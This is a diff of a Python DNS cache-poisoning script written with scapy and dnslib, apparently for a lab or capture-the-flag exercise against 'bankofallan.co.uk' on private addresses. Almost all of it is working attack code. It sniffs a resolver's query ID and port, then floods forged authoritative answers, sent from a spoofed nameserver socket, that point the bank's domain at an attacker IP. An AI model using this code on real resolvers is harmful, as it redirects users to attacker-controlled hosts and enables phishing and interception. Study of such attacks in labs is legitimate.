@@ -1,21 +1,22 @@
 from scapy.layers.dns import *
 from scapy.all import *
-########################################### TODO in
 from dnslib import *
 from threading import Thread
+########################################### TODO in
 
-
+'''
 badguyDNSport = 53
 flagPort = 1337
 ip_DNS = "192.168.56.101"
 ip_attacker = "192.168.56.1"
-ip_NS = "10.0.0.1"
-site = "wwwtest.bankofallan.co.uk"
+ip_NS = "10.0.0.1"'''
 ########################################### out
 
 DNS_SPOOF_IP = "10.0.0.1"
-BAD_DNS_IP = "192.168.56.1"
 VULN_DNS_IP = "192.168.56.101"
+VULN_DNS_DPORT = 53
+FAKE_REQUEST = "spoofing.bankofallan.co.uk"
+BAD_DNS_IP = "192.168.56.1"
 
 Q_ID = 0                # query ID globale
 PORT_NUMBER = 0         # porta da catturare
@@ -66,11 +67,11 @@ def sniffer_job():
         global Q_ID
         global PORT_NUMBER
 
-        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
+        #filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
         # TODO deve cambiare se la porta non e' 53
 
         pkts = sniff(count=1, timeout=1,
-                     filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
+                     filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(VULN_DNS_DPORT),
                      lfilter=lambda pkt: pkt.haslayer(DNS))
 
         Q_ID = pkts[0].getlayer(DNS).id
@@ -100,7 +101,7 @@ def master_job():
         listener_thread.start()
 
         while GOAL == 0:
-                print ('\n\n\nTry # ' + str(N_TRY))
+
 
                 sniffer_thread = FirstThread(name="sniffer", job=0)
                 sniffer_thread.start()
@@ -113,12 +114,14 @@ def master_job():
                         sniffer_thread.join()
                         continue
 
+                print ('\n\n\nTry # ' + str(N_TRY))
                 print ('[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
+
 
                 #print ("len2: " + str(len(PACKETS)))
                 # preparo i pacchetti
 
-                spoof = IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))
+                spoof = IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST))
                 #PACKETS.append(spoof)
 
                 '''for index in range(1, 999):
@@ -134,7 +137,7 @@ def master_job():
                                             rdata=BAD_DNS_IP)) /
                                      DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
                         PACKETS.append(pkt)'''
-                for index in range(1, 999):
+                for index in range(1, 1200):
                         '''DNS_pkt = DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L,
                                   rcode='ok',
                                   qdcount=1, ancount=1,
@@ -146,16 +149,16 @@ def master_job():
                                   ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
                                             rdata=BAD_DNS_IP)) /
                                      DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))'''
-                        DNS_pkt = DNSRecord(DNSHeader(id=(Q_ID + index), qr=1, aa=1, ra=1), q=DNSQuestion(site), a=RR("bankofallan.co.uk", QTYPE.A, rdata=A(BAD_DNS_IP), ttl=6000)).pack()
+                        DNS_pkt = DNSRecord(DNSHeader(id=((Q_ID + index) % 65535), qr=1, aa=1, ra=1), q=DNSQuestion(FAKE_REQUEST), a=RR("bankofallan.co.uk", QTYPE.A, rdata=A(BAD_DNS_IP), ttl=6000)).pack()
                         PACKETS.append(DNS_pkt)
 
                 #send(spoof)
                 ################################ TODO in
-                sock_dns.sendto(DNSRecord.question("123.bankofallan.co.uk").pack(), (ip_DNS, 53))
+                sock_dns.sendto(DNSRecord.question(FAKE_REQUEST).pack(), (VULN_DNS_IP, 53))
 
                 for pkt in PACKETS:
 
-                        fakeDNS_sock.sendto(pkt, (ip_DNS, PORT_NUMBER))
+                        spoof_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))
                 ################################ out
 
                 # TODO controllare le porte
@@ -184,11 +187,12 @@ def master_job():
 ############################ MAIN ###########################
 
 # inizzializzazione socket dnslib
-######################### TODO in
-fakeDNS_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-fakeDNS_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-fakeDNS_sock.bind(("10.0.0.1", 53))
+spoof_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+spoof_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+spoof_sock.bind((DNS_SPOOF_IP, 53))
+#spoof_sock.bind((BAD_DNS_IP, 53))
 
+######################### TODO in
 sock_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock_dns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 #########################out
